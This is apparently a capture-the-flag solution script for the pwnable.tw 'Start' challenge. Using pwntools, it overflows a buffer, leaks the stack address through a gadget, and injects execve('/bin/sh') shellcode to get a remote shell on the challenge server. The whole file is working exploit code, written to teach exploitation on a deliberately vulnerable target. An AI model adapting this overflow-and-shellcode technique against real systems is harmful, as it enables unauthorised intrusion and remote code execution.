#!/usr/bin/python
'''
CHALLENGE SOLUTION: pwnable.tw - Start
AUTHOR: Hunter Gregal
'''
from pwn import *

''' SETUP '''
#set context
context(arch='i386', os='linux', endian='little')

#server
HOST = "chall.pwnable.tw"
PORT = 10000

#connect
r = remote(HOST, PORT)

#Local Debugging
#r = process('./start')
#gdb.attach(proc.pidof(r)[0], "b *0x8048087\n")

''' FOUND THROUGH DEBUGING '''
BUFSIZE = 20 # Bytes to write before return address (EIP)
ROPGADGET1 = p32(0x08048087) # ROPGADGET -> mov %ecx, %esp // leaks stack pointer

''' JUMP TO USER INPUT '''
#welcome msg
print r.recvuntil(':') 

''' LEAK ADDRESS OF USER INPUT '''
# Return to ROP gadget that will leak the stack pointer (our input buffer)
junk = 'A' * BUFSIZE  # pad buffer with A's
ret =  ROPGADGET1 # ROP GADJET -> mov %ecx,%esp //leak ESP
leakPayload = junk+ret

#Execute leak
r.send(leakPayload) #Not sendline , /n breaks leak in this case

leak = u32(r.recv(4)) #convert leak addr
print "LEAK: %s" % hex(leak)
r.recv() #recv rest if any


''' BUILD FINAL PAYLOAD '''
# Ret to shellcode using address of input (leak)
# In this case we will place our shellcode AFTER the buffer, and jump to it so that we are not limited in shellcode size
junk = "B" * BUFSIZE # Pad with B's
ret = p32(leak+BUFSIZE+4) # &leak+20+4 // Calculate shellcode address past our buffer
nopsled = asm(shellcraft.nop()) * 8 # Nopsled safety net for shellcode
sc = asm(
            shellcraft.pushstr('/bin/sh') + # push /bin/sh
            shellcraft.syscall('SYS_execve', 'esp', 0, 0) # call execve 
        ) #shellcode

finalPayload = junk+ret+nopsled+sc
print "FINAL PAYLOAD: %s" % finalPayload
#FINAL PAYLOAD: ("B"*20)+(&leak+24)+(NOP*8)+(shellcode)


''' DROP TO REMOTE SHELL '''
r.send(finalPayload)
r.interactive()
